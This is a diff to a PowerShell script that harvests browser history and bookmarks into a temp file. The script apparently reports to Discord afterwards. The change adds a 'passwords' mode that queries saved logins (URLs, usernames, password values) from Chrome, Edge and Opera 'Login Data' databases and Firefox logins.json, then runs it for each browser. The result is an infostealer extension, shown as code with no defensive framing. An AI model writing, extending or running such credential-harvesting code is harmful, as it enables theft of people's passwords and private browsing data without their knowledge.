@@ -14,10 +14,10 @@ function Get-BrowserData {
     )
 
     $Path = switch ($Browser) {
-        'chrome'  { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" } }
-        'edge'    { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" } }
-        'firefox' { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" } }
-        'opera'   { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" } }
+        'chrome'  { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" } }
+        'edge'    { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } }
+        'firefox' { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
+        'opera'   { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" } elseif ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } }
         default { Write-Host 'Unsupported browser or data type specified'; return }
     }
 
@@ -27,15 +27,29 @@ function Get-BrowserData {
     }
 
     try {
-        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-        $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
-        $Value | ForEach-Object {
-            $Key = $_
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
+        if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
+            $sqliteCommand = "sqlite3.exe"
+            $query = "SELECT origin_url, username_value, password_value FROM logins"
+            if (Test-Path $sqliteCommand) {
+                $passwordData = & $sqliteCommand $Path $query
+                Write-Output "[$Browser Passwords]: $passwordData"
+            } else {
+                Write-Host 'sqlite3.exe not found. Unable to extract passwords.'
+            }
+        } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
+            $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
+            Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
+        } else {
+            $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
+            $Value | ForEach-Object {
+                $Key = $_
+                New-Object -TypeName PSObject -Property @{
+                    User = $env:UserName
+                    Browser = $Browser
+                    DataType = $DataType
+                    Data = $_
+                }
             }
         }
     } catch {
@@ -56,11 +70,15 @@ if ([string]::IsNullOrEmpty($dc)) {
 $outputFile = "$env:TMP\--BrowserData.txt"
 Get-BrowserData -Browser "edge" -DataType "history" >> $outputFile
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
 Get-BrowserData -Browser "chrome" -DataType "history" >> $outputFile
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
 Get-BrowserData -Browser "firefox" -DataType "history" >> $outputFile
+Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
 Get-BrowserData -Browser "opera" -DataType "history" >> $outputFile
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $outputFile
+Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
 
 # Send completion notification to Discord
 try {
